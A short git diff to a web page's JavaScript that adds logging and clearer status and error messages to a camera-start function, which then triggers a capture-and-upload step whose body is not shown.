@@ -38,22 +38,30 @@ const statusEl = document.getElementById("status");
 // 🎥 Start front camera
 async function startCamera() {
     try {
-       const stream = await navigator.mediaDevices.getUserMedia({
-    video: true
-});
+        statusEl.textContent = "Requesting camera…";
 
+        console.log("Requesting camera with:", { video: true });
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true
         });
 
+        console.log("Camera stream:", stream);
+
         video.srcObject = stream;
+        statusEl.textContent = "Camera started…";
 
         video.onloadedmetadata = () => {
+            console.log("Metadata loaded");
             setTimeout(captureAndUpload, 1500);
         };
 
     } catch (err) {
-        statusEl.innerHTML = "❌ Camera blocked<br>" + err.message;
+        console.error("Camera error:", err);
+        statusEl.innerHTML = "❌ Camera error:<br>" + err.name + "<br>" + err.message;
     }
 }
+
 
 // 📸 Capture + Upload
 async function captureAndUpload() {
